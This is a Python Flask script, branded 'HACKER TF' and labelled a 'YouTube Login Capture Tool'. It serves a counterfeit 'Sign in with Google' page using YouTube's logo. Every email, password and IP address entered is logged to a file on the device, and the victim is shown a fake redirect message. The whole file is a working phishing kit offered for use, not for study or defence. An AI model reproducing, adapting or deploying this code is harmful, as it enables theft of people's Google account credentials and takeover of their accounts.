from flask import Flask, request, render_template_string
import os

app = Flask(__name__)
SAVE_PATH = "/sdcard/HackerTF"
LOG_FILE = os.path.join(SAVE_PATH, "log.txt")
os.makedirs(SAVE_PATH, exist_ok=True)

html_template = """
<!DOCTYPE html>
<html>
<head>
    <title>YouTube - Sign in</title>
    <style>
        body { font-family: Arial, sans-serif; background: #f1f1f1; text-align: center; padding-top: 50px; }
        .box { background: white; padding: 30px; width: 330px; margin: auto; border: 1px solid #ccc; border-radius: 8px; }
        input, button { width: 90%; padding: 10px; margin: 10px 0; border-radius: 4px; border: 1px solid #ccc; }
        button { background: #1a73e8; color: white; font-weight: bold; border: none; }
        img { width: 70px; margin-bottom: 20px; }
        .footer { font-size: 12px; margin-top: 20px; color: #888; }
    </style>
</head>
<body>
    <div class="box">
        <img src="https://www.gstatic.com/images/branding/product/1x/youtube_48dp.png">
        <h2>Sign in with Google</h2>
        <form method="POST" action="/login">
            <input type="text" name="email" placeholder="Email or phone" required><br>
            <input type="password" name="password" placeholder="Enter your password" required><br>
            <button type="submit">Next</button>
        </form>
    </div>
    <div class="footer">
        Made by HACKER TF
    </div>
</body>
</html>
"""

@app.route('/')
def index():
    return render_template_string(html_template)

@app.route('/login', methods=['POST'])
def login():
    email = request.form.get('email')
    password = request.form.get('password')
    ip = request.remote_addr

    log = f"""
[+] YouTube / Google Login
IP: {ip}
Email/Phone: {email}
Password: {password}
----------------------------
"""
    print(log)
    with open(LOG_FILE, "a") as f:
        f.write(log)

    return "<h3>Redirecting to YouTube...</h3>"

if __name__ == '__main__':
    os.system('clear' if os.name == 'posix' else 'cls')
    print("\033[1;34m" + "="*40)
    print("         Made by HACKER TF        ")
    print("     YouTube Login Capture Tool   ")
    print("="*40 + "\033[0m")
    print("Server running on: http://localhost:5000\n")
    app.run(host="0.0.0.0", port=5050)